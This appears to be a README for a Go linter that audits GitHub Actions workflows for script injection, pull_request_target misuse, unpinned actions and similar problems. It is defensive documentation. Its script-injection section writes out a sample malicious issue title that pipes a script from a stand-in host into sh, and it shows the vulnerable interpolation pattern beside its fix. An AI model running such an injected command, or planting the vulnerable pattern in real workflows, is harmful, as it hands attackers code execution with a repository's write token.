# GitHub Actions

A workflow checker written in Go, pointed at this repository's own CI.

```bash
go test ./...
```

No services, no network, no Docker. It parses YAML.

## Why a checker

Every other module here verifies its claims with a test. A module of annotated YAML would be the one place a
reader has to take my word, and annotated YAML goes stale the moment the workflow changes.

So `workflow/` is a small linter: it models the parts of a workflow that matter and reports the problems that
actually bite. The tests then run it against `.github/workflows/ci.yml`, the file that runs on every push to this
repository. If someone edits that file in a way that breaks a claim below, these tests fail.

That already paid off once. `TestOwnCIPinsEveryThirdPartyAction` was written expecting no third-party actions at
all, failed on `docker/setup-buildx-action@v3`, and the fix was to pin it to a commit sha. The commit is in the
history.

## What the checker finds

| Rule | What it catches |
|---|---|
| `script-injection` | An expression an outsider controls, interpolated into a `run` block |
| `pull_request_target` | Checking out the PR's own code while holding a writable token |
| `unpinned-action` | A third-party action on a mutable tag, or with no version at all |
| `permissions` | No `permissions:` block, or `write-all` |
| `timeout` | No `timeout-minutes`, so a hung job runs for six hours |
| `fail-fast` | A matrix using the default, which hides everything after the first failure |

`Order` topologically sorts the jobs, which both prints the shape of a workflow and catches a cycle in `needs`.
`UndeclaredNeeds` catches a `needs` naming a job that was renamed.

## Script injection

This is the one that matters, so it has a fixture: [`examples/injectable.yml`](examples/injectable.yml) contains
the bug and the fix, side by side, and the test asserts that the checker finds exactly one of them.

```yaml
- run: |
    echo "New issue: ${{ github.event.issue.title }}"
```

The expression is substituted as **text**, before the shell parses anything. An issue titled

```
"; curl -s https://example.com/x.sh | sh; #
```

runs that script with the repository's token.

It is not a quoting problem. Adding quotes moves the metacharacter the attacker needs; it does not remove one.
The fix is to keep the value out of the source text entirely:

```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    echo "New issue: $TITLE"
```

The environment is not parsed as shell. The quotes around `"$TITLE"` now matter for word splitting and nothing
else.

The contexts a stranger can set are listed in `attackerControlled` in [`workflow/workflow.go`](workflow/workflow.go):
issue and PR titles and bodies, comment bodies, commit messages, and `head_ref`, because a fork's branch names
are chosen by the fork's owner.

## `on` is not a boolean, unless it is

In YAML 1.1 the bare word `on` is the boolean true, along with `off`, `yes` and `no`. A 1.1 parser therefore
hands you a workflow whose trigger key is called `true`. `yaml.v3` implements YAML 1.2 where only `true` and
`false` are booleans, so `on` stays a string.

`TestOnIsNotParsedAsTrue` pins that, because every trigger rule in this package depends on it.

`on` is also three types. `on: push`, `on: [push, pull_request]` and `on: {push: {branches: [main]}}` are all
legal, which is why `Workflow.On` is a raw `yaml.Node` and `Triggers()` decodes whichever shape turned up.

## A colon inside a quoted shell string

This one is found by the fixture rather than described in it:

```yaml
run: echo "New issue: ${{ github.event.issue.title }}"
```

does not parse. The value is a plain scalar, so YAML reaches the `: ` inside the double quotes and decides
`echo "New issue` is a key. The quotes belong to the shell and YAML does not know that. A block scalar removes
the ambiguity, which is why nearly every real `run:` is written with a `|`.

## What the tests assert about this repository

| Claim | Where |
|---|---|
| The workflow parses with a model that rejects unknown keys | `TestOwnCIParses` |
| No expression an outsider controls reaches a shell | `TestOwnCIHasNoScriptInjection` |
| Every `needs` names a job that exists, and there is no cycle | `TestOwnCINeedsAreConsistent` |
| Nothing uses `needs`, so all 10 jobs run in parallel | `TestOwnCIJobsAreIndependent` |
| 21 first-party actions, 1 third-party, sha-pinned | `TestOwnCIPinsEveryThirdPartyAction` |
| All 5 service containers declare a health check | `TestOwnCIServiceContainersHaveHealthChecks` |

That last one is not cosmetic. Without a health check a service container is "available" as soon as the
**container** starts, which is before Postgres accepts connections. In this repository every database test skips
when it cannot reach a database, so the failure mode is not a red build. It is a green build that ran nothing.

## The examples

Three files in [`examples/`](examples/), parsed and checked by the tests, never run.

- [`release.yml`](examples/release.yml) builds for four platforms on a `v*` tag and publishes. It shows
  `fail-fast: false` on a release matrix, artifacts as the only thing that survives between jobs, a narrower
  `permissions` on the one job that writes, and a tag name passed through `env` rather than interpolated.
- [`scheduled.yml`](examples/scheduled.yml) is a nightly with `workflow_dispatch` so it can be tested today
  rather than tomorrow. Cron is UTC with no time-zone field, and GitHub does not promise the minute.
  `if: failure()` opening an issue is the whole notification system, because a red X on a scheduled run emails
  the file's last committer and nobody else.
- [`injectable.yml`](examples/injectable.yml) is the vulnerability fixture.

`TestReleaseExampleIsClean` asserts the first two produce no findings at all. A checker that only ever fires is
a checker nobody trusts.

## What a workflow actually is

A YAML file in `.github/workflows`. `on` says what triggers it. `jobs` run in parallel unless `needs` orders
them. `steps` inside a job run in sequence on one machine.

Two facts shape everything else. A job gets a **fresh machine**, so nothing survives between jobs except an
artifact or a cache. And a workflow file is **code that runs with a token that can write to the repository**,
which is why half this package is about who can make it run.

### Triggers worth knowing apart

`pull_request` runs with a read-only token and no secrets, because the code being tested came from a stranger.

`pull_request_target` runs the workflow from the **base** branch with a full token and the secrets, which is what
makes labelling and commenting on a PR possible. Checking out the PR's head inside one combines attacker-supplied
code with a writable token, and `go test ./...` then runs it. That is the shape of several real supply-chain
compromises, and it is the `pull_request_target` rule above.

### Pinning, and what each form trusts

| Form | Trusts |
|---|---|
| `@v4` | The owner not to move the tag. Tags are mutable. |
| `@v4.1.7` | The same, with a smaller blast radius. |
| `@<40 hex>` | Nothing. A sha cannot be repointed. |

The cost of a sha is that nothing bumps it for you, so the tag it corresponds to goes in a comment next to it.
That is what `.github/workflows/ci.yml` does.
